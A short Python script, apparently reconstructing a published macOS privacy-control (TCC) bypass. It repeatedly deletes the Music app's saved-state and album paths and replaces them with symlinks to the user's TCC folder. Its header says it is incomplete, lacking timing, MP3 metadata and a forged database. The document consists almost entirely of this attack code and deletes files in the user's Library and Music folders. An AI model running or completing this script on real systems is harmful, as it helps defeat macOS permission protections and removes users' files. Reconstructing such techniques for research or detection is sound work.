# Reconstruction of the two path-redirection operations described by Jamf.
# Not the original exploit: timing, MP3 metadata and a forged DB are absent.
import os
from pathlib import Path

home = str(Path.home())
state = home + '/Library/Saved Application State/com.apple.Music.savedState'
media = home + '/Music/Music/Media.localized/Album'
target = home + '/Library/Application Support/com.apple.TCC'
for _ in range(10000):
    for link in (state, media):
        try:
            os.unlink(link)
        except FileNotFoundError:
            pass
        os.symlink(target, link)
